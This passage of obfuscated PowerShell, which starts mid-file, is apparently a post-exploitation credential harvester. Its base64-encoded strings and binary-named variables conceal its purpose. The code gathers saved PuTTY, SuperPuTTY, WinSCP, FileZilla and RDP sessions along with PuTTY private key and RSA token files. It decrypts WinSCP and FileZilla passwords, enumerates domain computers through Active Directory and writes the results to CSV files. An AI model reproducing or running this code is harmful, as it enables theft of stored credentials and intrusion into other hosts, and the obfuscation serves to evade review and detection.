          $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgByAGQAcAA='))) {[void]${_00111011000101000}.Add(${00001011000101110})} 
          $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBzAGQAdABpAGQA'))) {[void]${_10101111001001101}.Add(${00001011000101110})}
        }
      }
    }
  }
}
function _00111100110111100(${_01100111100111011}) { foreach (${00111011111001100} in ${_01100111100111011}) { ${00000110010110111} = "" | select -Property Source,Path 
      ${00000110010110111}.Source = ${10111101000001111} ${01111110101001011} = [IO.Path]::GetExtension(${00111011111001100}.Name) if (${01111110101001011} -eq 
      $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBwAHAAawA=')))) {
        ${00000110010110111}.Path = ${00111011111001100}.Name [void]${10100011010111001}.Add(${00000110010110111})
      } elseif (${01111110101001011} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgByAGQAcAA=')))) {
        ${00000110010110111}.Path = ${00111011111001100}.Name [void]${00011101111001111}.Add(${00000110010110111})
      } elseif (${01111110101001011} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBzAGQAdABpAGQA')))) {
        ${00000110010110111}.Path = ${00111011111001100}.Name [void]${01110111110000000}.Add(${00000110010110111})
      }
  }
  if (${10100011010111001}.count -gt 0) { ${10000100110110100} | Add-Member -MemberType NoteProperty -Name 
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABQAEsAIABGAGkAbABlAHMA'))) -Value ${00011101111001111} if ($o) {
      ${10100011010111001} | Export-CSV -Append -Path (${10101001001011011} + 
      $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABQAHUAVABUAFkAIABwAHAAawAgAEYAaQBsAGUAcwAuAGMAcwB2AA==')))) -NoTypeInformation
    } else {
      echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AFQAVABZACAAUAByAGkAdgBhAHQAZQAgAEsAZQB5ACAARgBpAGwAZQBzACAAKAAuAHAAcABrACkA'))) 
      ${10100011010111001} | fl | Out-String
    }
  }
  if (${00011101111001111}.count -gt 0) { ${10000100110110100} | Add-Member -MemberType NoteProperty -Name 
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBEAFAAIABGAGkAbABlAHMA'))) -Value ${00011101111001111} if ($o) {
      ${00011101111001111} | Export-CSV -Append -Path (${10101001001011011} + 
      $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABNAGkAYwByAG8AcwBvAGYAdAAgAHIAZABwACAARgBpAGwAZQBzAC4AYwBzAHYA')))) -NoTypeInformation
    } else {
      echo 
      $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAGMAcgBvAHMAbwBmAHQAIABSAEQAUAAgAEMAbwBuAG4AZQBjAHQAaQBvAG4AIABGAGkAbABlAHMAIAAoAC4AcgBkAHAAKQA='))) 
      ${00011101111001111} | fl | Out-String
    }
  }
  if (${01110111110000000}.count -gt 0) { ${10000100110110100} | Add-Member -MemberType NoteProperty -Name 
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBkAHQAaQBkACAARgBpAGwAZQBzAA=='))) -Value ${01110111110000000} if ($o) {
      ${01110111110000000} | Export-CSV -Append -Path (${10101001001011011} + 
      $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABSAFMAQQAgAHMAZAB0AGkAZAAgAEYAaQBsAGUAcwAuAGMAcwB2AA==')))) -NoTypeInformation
    } else {
      echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBTAEEAIABUAG8AawBlAG4AcwAgACgAcwBkAHQAaQBkACkA'))) ${01110111110000000} | fl | Out-String
    }
  }
} 
function _01100001110111011(${_00000010111110000}) { foreach(${01111000010000011} in ${_00000010111110000}) { ${00001111000011010} = "" | select -Property 
    Source,Session,Hostname ${00001111000011010}.Source = ${00111110011110111} ${00001111000011010}.Session = (Split-Path ${01111000010000011} -Leaf) 
    ${00001111000011010}.Hostname = ((gp -Path 
    ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAGMAcgBvAHMAbwBmAHQALgBQAG8AdwBlAHIAUwBoAGUAbABsAC4AQwBvAHIAZQBcAFIAZQBnAGkAcwB0AHIAeQA6ADoA'))) + 
    ${01111000010000011}) -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABvAHMAdABuAGEAbQBlAA=='))) -ErrorAction SilentlyContinue).Hostname) 
    [void]${01111101100010010}.Add(${00001111000011010})
  }
  if ($o) { ${01111101100010010} | Export-CSV -Append -Path (${10101001001011011} + 
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABQAHUAVABUAFkALgBjAHMAdgA=')))) -NoTypeInformation
  } else {
    echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AFQAVABZACAAUwBlAHMAcwBpAG8AbgBzAA=='))) ${01111101100010010} | fl | Out-String
  }
  ${10000100110110100} | Add-Member -MemberType NoteProperty -Name 
  $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AFQAVABZACAAUwBlAHMAcwBpAG8AbgBzAA=='))) -Value ${01111101100010010}
} 
function _01000111010101101(${_01010010110101111}) { foreach(${01111000010000011} in ${_01010010110101111}) { ${10100110110110011} = 
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAGMAcgBvAHMAbwBmAHQALgBQAG8AdwBlAHIAUwBoAGUAbABsAC4AQwBvAHIAZQBcAFIAZQBnAGkAcwB0AHIAeQA6ADoA'))) + 
    ${01111000010000011} ${01110110100001010} = "" | select -Property Source,Hostname,Username ${01110110100001010}.Source = ${00111110011110111} ${01110110100001010}.Hostname 
    = (Split-Path ${01111000010000011} -Leaf) ${01110110100001010}.Username = ((gp -Path ${10100110110110011} -Name 
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBuAGEAbQBlAEgAaQBuAHQA'))) -ErrorAction SilentlyContinue).UsernameHint) 
    [void]${10001101110101001}.Add(${01110110100001010})
  } 
  if ($o) { ${10001101110101001} | Export-CSV -Append -Path (${10101001001011011} + 
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABSAEQAUAAuAGMAcwB2AA==')))) -NoTypeInformation
  } else {
    echo 
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAGMAcgBvAHMAbwBmAHQAIABSAGUAbQBvAHQAZQAgAEQAZQBzAGsAdABvAHAAIAAoAFIARABQACkAIABTAGUAcwBzAGkAbwBuAHMA'))) 
    ${10001101110101001} | fl | Out-String
  }
  ${10000100110110100} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBEAFAAIABTAGUAcwBzAGkAbwBuAHMA'))) 
  -Value ${10001101110101001}
} 
function _10000100100101100(${_01001100010111010}) { foreach(${01111000010000011} in ${_01001100010111010}) { ${00101110011000001} = 
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAGMAcgBvAHMAbwBmAHQALgBQAG8AdwBlAHIAUwBoAGUAbABsAC4AQwBvAHIAZQBcAFIAZQBnAGkAcwB0AHIAeQA6ADoA'))) + 
    ${01111000010000011} ${10101000000111100} = "" | select -Property Source,Session,Hostname,Username,Password ${10101000000111100}.Source = ${00111110011110111} 
    ${10101000000111100}.Session = (Split-Path ${01111000010000011} -Leaf) ${10101000000111100}.Hostname = ((gp -Path ${00101110011000001} -Name 
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABvAHMAdABuAGEAbQBlAA=='))) -ErrorAction SilentlyContinue).Hostname) ${10101000000111100}.Username = 
    ((gp -Path ${00101110011000001} -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBuAGEAbQBlAA=='))) -ErrorAction 
    SilentlyContinue).Username) ${10101000000111100}.Password = ((gp -Path ${00101110011000001} -Name 
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHMAcwB3AG8AcgBkAA=='))) -ErrorAction SilentlyContinue).Password) if (${10101000000111100}.Password) 
    {
      ${10110011010010011} = ((gp -Path (Join-Path ${10000101101010100}.PSPath 
      $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBPAEYAVABXAEEAUgBFAFwATQBhAHIAdABpAG4AIABQAHIAaQBrAHIAeQBsAFwAVwBpAG4AUwBDAFAAIAAyAFwAQwBvAG4AZgBpAGcAdQByAGEAdABpAG8AbgBcAFMAZQBjAHUAcgBpAHQAeQA=')))) 
      -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUATQBhAHMAdABlAHIAUABhAHMAcwB3AG8AcgBkAA=='))) -ErrorAction 
      SilentlyContinue).UseMasterPassword) if (!${10110011010010011}) {
          ${10101000000111100}.Password = (_00111011011010000 ${10101000000111100}.Hostname ${10101000000111100}.Username ${10101000000111100}.Password)
      } else {
          ${10101000000111100}.Password = 
          $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBhAHYAZQBkACAAaQBuACAAcwBlAHMAcwBpAG8AbgAsACAAYgB1AHQAIABtAGEAcwB0AGUAcgAgAHAAYQBzAHMAdwBvAHIAZAAgAHAAcgBlAHYAZQBuAHQAcwAgAHAAbABhAGkAbgB0AGUAeAB0ACAAcgBlAGMAbwB2AGUAcgB5AA==')))
      }
    }
    [void]${00010100001000100}.Add(${10101000000111100})
  } 
  if ($o) { ${00010100001000100} | Export-CSV -Append -Path (${10101001001011011} + 
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABXAGkAbgBTAEMAUAAuAGMAcwB2AA==')))) -NoTypeInformation
  } else {
    echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AUwBDAFAAIABTAGUAcwBzAGkAbwBuAHMA'))) ${00010100001000100} | fl | Out-String
  }
  ${10000100110110100} | Add-Member -MemberType NoteProperty -Name 
  $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AUwBDAFAAIABTAGUAcwBzAGkAbwBuAHMA'))) -Value ${00010100001000100}
} 
function _10101010000011011(${_10101111001001101}) { foreach (${10010001010110110} in ${_10101111001001101}.VersionInfo.FileName) { ${00010111001111101} = "" | select 
    -Property 
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAHUAcgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaAA='))) 
    ${00010111001111101}."Source" = ${00111110011110111} ${00010111001111101}."Path" = ${10010001010110110} [void]${01110111110000000}.Add(${00010111001111101})
  }
  if (${01110111110000000}.count -gt 0) { ${10000100110110100} | Add-Member -MemberType NoteProperty -Name 
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBkAHQAaQBkACAARgBpAGwAZQBzAA=='))) -Value ${01110111110000000} if ($o) {
      ${01110111110000000} | select * | Export-CSV -Append -Path (${10101001001011011} + 
      $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABSAFMAQQAgAHMAZAB0AGkAZAAgAEYAaQBsAGUAcwAuAGMAcwB2AA==')))) -NoTypeInformation
    } else {
      echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBTAEEAIABUAG8AawBlAG4AcwAgACgAcwBkAHQAaQBkACkA'))) ${01110111110000000} | select * | fl | 
      Out-String
    }
  }
} 
function _01001011101110110(${_00111011000101000}) { foreach (${10010001010110110} in ${_00111011000101000}.VersionInfo.FileName) { ${00101110100100110} = "" | select 
    -Property 
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAHUAcgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABvAHMAdABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBhAHQAZQB3AGEAeQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AbQBwAHQAcwAgAGYAbwByACAAQwByAGUAZABlAG4AdABpAGEAbABzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAGkAcwB0AHIAYQB0AGkAdgBlACAAUwBlAHMAcwBpAG8AbgA='))) 
    ${00101110100100110}."Source" = (Hostname) ${00101110100100110}."Path" = ${10010001010110110} ${00101110100100110}."Hostname" = try { (sls -Path ${10010001010110110} 
    -Pattern $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AGwAbAAgAGEAZABkAHIAZQBzAHMAOgBbAGEALQB6AF0AOgAoAC4AKgApAA==')))).Matches.Groups[1].Value } 
    catch {} ${00101110100100110}."Gateway" = try { (sls -Path ${10010001010110110} -Pattern 
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwBhAHQAZQB3AGEAeQBoAG8AcwB0AG4AYQBtAGUAOgBbAGEALQB6AF0AOgAoAC4AKgApAA==')))).Matches.Groups[1].Value } 
    catch {} ${00101110100100110}."Administrative Session" = try { (sls -Path ${10010001010110110} -Pattern 
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAG0AaQBuAGkAcwB0AHIAYQB0AGkAdgBlACAAcwBlAHMAcwBpAG8AbgA6AFsAYQAtAHoAXQA6ACgALgAqACkA')))).Matches.Groups[1].Value 
    } catch {}
    ${00101110100100110}."Prompts for Credentials" = try { (sls -Path ${10010001010110110} -Pattern 
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAByAG8AbQBwAHQAIABmAG8AcgAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwA6AFsAYQAtAHoAXQA6ACgALgAqACkA')))).Matches.Groups[1].Value 
    } catch {}
    if (!${00101110100100110}."Administrative Session" -or !${00101110100100110}."Administrative Session" -eq 0) { ${00101110100100110}."Administrative Session" = 
      $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAGUAcwAgAG4AbwB0ACAAYwBvAG4AbgBlAGMAdAAgAHQAbwAgAGEAZABtAGkAbgAgAHMAZQBzAHMAaQBvAG4AIABvAG4AIAByAGUAbQBvAHQAZQAgAGgAbwBzAHQA')))
    } else {
      ${00101110100100110}."Administrative Session" = 
      $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AbgBlAGMAdABzACAAdABvACAAYQBkAG0AaQBuACAAcwBlAHMAcwBpAG8AbgAgAG8AbgAgAHIAZQBtAG8AdABlACAAaABvAHMAdAA=')))
    }
    if (!${00101110100100110}."Prompts for Credentials" -or ${00101110100100110}."Prompts for Credentials" -eq 0) { ${00101110100100110}."Prompts for Credentials" = "No"
    } else {
      ${00101110100100110}."Prompts for Credentials" = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
    }
    [void]${00011101111001111}.Add(${00101110100100110})
  }
  if (${00011101111001111}.count -gt 0) { ${10000100110110100} | Add-Member -MemberType NoteProperty -Name 
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBEAFAAIABGAGkAbABlAHMA'))) -Value ${00011101111001111} if ($o) {
      ${00011101111001111} | select * | Export-CSV -Append -Path (${10101001001011011} + 
      $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABNAGkAYwByAG8AcwBvAGYAdAAgAHIAZABwACAARgBpAGwAZQBzAC4AYwBzAHYA')))) -NoTypeInformation
    } else {
      echo 
      $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAGMAcgBvAHMAbwBmAHQAIABSAEQAUAAgAEMAbwBuAG4AZQBjAHQAaQBvAG4AIABGAGkAbABlAHMAIAAoAC4AcgBkAHAAKQA='))) 
      ${00011101111001111} | select * | fl | Out-String
    }
  }
} 
function _00101010010011101(${_10001100001011101}) { foreach (${10010001010110110} in ${_10001100001011101}.VersionInfo.FileName) { ${01110001100011110} = "" | select 
    -Property 
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAHUAcgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AdABvAGMAbwBsAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AbQBlAG4AdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBhAHQAZQAgAEsAZQB5ACAARQBuAGMAcgB5AHAAdABpAG8AbgA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBhAHQAZQAgAEsAZQB5AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBhAHQAZQAgAE0AQQBDAA=='))) 
    ${01110001100011110}."Source" = (Hostname) ${01110001100011110}."Path" = ${10010001010110110} ${01110001100011110}."Protocol" = try { (sls -Path ${10010001010110110} 
    -Pattern $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('OgAgACgALgAqACkA'))) -Context 0,0).Matches.Groups[1].Value } catch {} 
    ${01110001100011110}."Private Key Encryption" = try { (sls -Path ${10010001010110110} -Pattern 
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAGMAcgB5AHAAdABpAG8AbgA6ACAAKAAuACoAKQA=')))).Matches.Groups[1].Value } catch {} 
    ${01110001100011110}."Comment" = try { (sls -Path ${10010001010110110} -Pattern 
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AbQBlAG4AdAA6ACAAKAAuACoAKQA=')))).Matches.Groups[1].Value } catch {} ${00001010100101010} = try { 
    (sls -Path ${10010001010110110} -Pattern 
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBhAHQAZQAtAEwAaQBuAGUAcwA6ACAAKAAuACoAKQA=')))).Matches.Groups[1].Value } catch {} 
    ${01110001100011110}."Private Key" = try { (sls -Path ${10010001010110110} -Pattern 
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBhAHQAZQAtAEwAaQBuAGUAcwA6ACAAKAAuACoAKQA='))) -Context 
    0,${00001010100101010}).Context.PostContext -Join "" } catch {} ${01110001100011110}."Private MAC" = try { (sls -Path ${10010001010110110} -Pattern 
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBhAHQAZQAtAE0AQQBDADoAIAAoAC4AKgApAA==')))).Matches.Groups[1].Value } catch {} 
    [void]${10100011010111001}.Add(${01110001100011110})
  }
  if (${10100011010111001}.count -gt 0) { ${10000100110110100} | Add-Member -MemberType NoteProperty -Name 
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABQAEsAIABGAGkAbABlAHMA'))) -Value ${10100011010111001} if ($o) {
      ${10100011010111001} | select * | Export-CSV -Append -Path (${10101001001011011} + 
      $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABQAHUAVABUAFkAIABwAHAAawAgAEYAaQBsAGUAcwAuAGMAcwB2AA==')))) -NoTypeInformation
    } else {
      echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AFQAVABZACAAUAByAGkAdgBhAHQAZQAgAEsAZQB5ACAARgBpAGwAZQBzACAAKAAuAHAAcABrACkA'))) 
      ${10100011010111001} | select * | fl | Out-String
    }
  }
} 
function _01111010001110000(${_01110110011100001}) { foreach(${01100000010100001} in 
  ${_01110110011100001}.SelectNodes($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwAvAEYAaQBsAGUAWgBpAGwAbABhADMALwBTAGUAcgB2AGUAcgBzAC8AUwBlAHIAdgBlAHIA'))))) 
  {
      ${10110001001000100} = @{} ${01100000010100001}.ChildNodes | % { 
          ${10110001001000100}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAHUAcgBjAGUA')))] = ${00111110011110111} if ($_.InnerText) {
              if ($_.Name -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHMAcwA=')))) { 
                  ${10110001001000100}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHMAcwB3AG8AcgBkAA==')))] = $_.InnerText
              } else {
                  ${10110001001000100}[$_.Name] = $_.InnerText
              }
          }
      }
    [void]${10111100100011001}.Add((New-Object PSObject -Property ${10110001001000100} | select -Property * -ExcludeProperty 
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IwB0AGUAeAB0AA=='))),LogonType,Type,BypassProxy,SyncBrowsing,PasvMode,DirectoryComparison,MaximumMultipleConnections,EncodingType,TimezoneOffset,Colour))
  } 
  foreach (${01111000010000011} in ${10111100100011001}) { ${01111000010000011}.Password = 
      [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(${01111000010000011}.Password)) if (${01111000010000011}.Protocol -eq "0") {
        ${01111000010000011}.Protocol = 
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAIABGAFQAUAAgAG8AdgBlAHIAIABUAEwAUwAgAGkAZgAgAGEAdgBhAGkAbABhAGIAbABlAA==')))
      } elseif (${01111000010000011}.Protocol -eq 1) {
        ${01111000010000011}.Protocol = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAIABTAEYAVABQAA==')))
      } elseif (${01111000010000011}.Protocol -eq 3) {
        ${01111000010000011}.Protocol = 
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHEAdQBpAHIAZQAgAGkAbQBwAGwAaQBjAGkAdAAgAEYAVABQACAAbwB2AGUAcgAgAFQATABTAA==')))
      } elseif (${01111000010000011}.Protocol -eq 4) {
        ${01111000010000011}.Protocol = 
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHEAdQBpAHIAZQAgAGUAeABwAGwAaQBjAGkAdAAgAEYAVABQACAAbwB2AGUAcgAgAFQATABTAA==')))
      } elseif (${01111000010000011}.Protocol -eq 6) {
        ${01111000010000011}.Protocol = 
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBuAGwAeQAgAHUAcwBlACAAcABsAGEAaQBuACAARgBUAFAAIAAoAGkAbgBzAGUAYwB1AHIAZQApAA==')))
      } 
  }
  if ($o) { ${10111100100011001} | Export-CSV -Append -Path (${10101001001011011} + 
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABGAGkAbABlAFoAaQBsAGwAYQAuAGMAcwB2AA==')))) -NoTypeInformation
  } else {
    echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBaAGkAbABsAGEAIABTAGUAcwBzAGkAbwBuAHMA'))) ${10111100100011001} | fl | Out-String
  }
  ${10000100110110100} | Add-Member -MemberType NoteProperty -Name 
  $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBaAGkAbABsAGEAIABTAGUAcwBzAGkAbwBuAHMA'))) -Value ${10111100100011001}
} 
function _01110101110100101(${_10100100011100010}) { foreach(${10001100100011111} in ${_10100100011100010}.ArrayOfSessionData.SessionData) { foreach (${00010100011000001} in 
    ${10001100100011111}) {
      if (${00010100011000001} -ne $null) { ${10010101000001111} = "" | select -Property 
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAHUAcgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBJAGQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBOAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABvAHMAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAcgBhAEEAcgBnAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHIAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AHQAdAB5ACAAUwBlAHMAcwBpAG8AbgA='))) 
        ${10010101000001111}."Source" = ${00111110011110111} ${10010101000001111}."SessionId" = ${00010100011000001}.SessionId ${10010101000001111}."SessionName" = 
        ${00010100011000001}.SessionName ${10010101000001111}."Host" = ${00010100011000001}.Host ${10010101000001111}."Username" = ${00010100011000001}.Username 
        ${10010101000001111}."ExtraArgs" = ${00010100011000001}.ExtraArgs ${10010101000001111}."Port" = ${00010100011000001}.Port ${10010101000001111}."PuTTY Session" = 
        ${00010100011000001}.PuttySession [void]${01010111100000001}.Add(${10010101000001111})
      } 
    }
  } 
  if ($o) { ${01010111100000001} | Export-CSV -Append -Path (${10101001001011011} + 
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABTAHUAcABlAHIAUAB1AFQAVABZAC4AYwBzAHYA')))) -NoTypeInformation
  } else {
    echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AHAAZQByAFAAdQBUAFQAWQAgAFMAZQBzAHMAaQBvAG4AcwA='))) ${01010111100000001} | Out-String
  }
  ${10000100110110100} | Add-Member -MemberType NoteProperty -Name 
  $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AHAAZQByAFAAdQBUAFQAWQAgAFMAZQBzAHMAaQBvAG4AcwA='))) -Value ${01010111100000001}
} 
function _01000111000111100 { ${01110000100101010} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAG0AcAB1AHQAZQByAA=='))) ${10111000000111010} = 
  New-Object System.DirectoryServices.DirectoryEntry ${10110010011011101} = New-Object System.DirectoryServices.DirectorySearcher ${10110010011011101}.SearchRoot = 
  ${10111000000111010} ${10110010011011101}.Filter = 
  ($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGEAdABlAGcAbwByAHkAPQAkAHsAMAAxADEAMQAwADAAMAAwADEAMAAwADEAMAAxADAAMQAwAH0AKQA=')))) 
  ${10011010000111100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQA='))) foreach (${00010001010111100} in 
  ${10011010000111100}){${10110010011011101}.PropertiesToLoad.Add(${00010001010111100})} return ${10110010011011101}.FindAll()
}
function _00010111111110011(${_00100100000111110}) { ${01100010100111010} = "" | select -Property flag,remainingPass ${00010101100011100} = 
  ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAxADIAMwA0ADUANgA3ADgAOQBBAEIAQwBEAEUARgA='))).indexOf(${_00100100000111110}[0]) * 16) 
  ${01110111011100010} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAxADIAMwA0ADUANgA3ADgAOQBBAEIAQwBEAEUARgA='))).indexOf(${_00100100000111110}[1]) 
  ${01110011011111111} = ${00010101100011100} + ${01110111011100010} ${11000001000011001} = (((-bnot (${01110011011111111} -bxor ${01000110011100100})) % 256) + 256) % 256 
  ${01100010100111010}.flag = ${11000001000011001} ${01100010100111010}.remainingPass = ${_00100100000111110}.Substring(2) return ${01100010100111010}
}
function _00111011011010000(${_01101100100101000}, ${_10110110000001101}, ${_10001001010100011}) { ${10111111100110001} = 255 ${01000110011100100} = 163 ${01011000001111101} = 
  0 ${00011010010010111} = ${_01101100100101000} + ${_10110110000001101} ${01001110011001000} = _00010111111110011(${_10001001010100011}) ${00111110010101001} = 
  ${01001110011001000}.flag if (${01001110011001000}.flag -eq ${10111111100110001}) {
    ${01001110011001000}.remainingPass = ${01001110011001000}.remainingPass.Substring(2) ${01001110011001000} = _00010111111110011(${01001110011001000}.remainingPass)
  }
  ${01011000001111101} = ${01001110011001000}.flag ${01001110011001000} = _00010111111110011(${01001110011001000}.remainingPass) ${01001110011001000}.remainingPass = 
  ${01001110011001000}.remainingPass.Substring((${01001110011001000}.flag * 2)) ${10101101110100001} = "" for (${00010001010111100}=0; ${00010001010111100} -lt 
  ${01011000001111101}; ${00010001010111100}++) {
    ${01001110011001000} = (_00010111111110011(${01001110011001000}.remainingPass)) ${10101101110100001} += [char]${01001110011001000}.flag
  }
  if (${00111110010101001} -eq ${10111111100110001}) { return ${10101101110100001}.Substring(${00011010010010111}.length)
  }
  return ${10101101110100001}
}
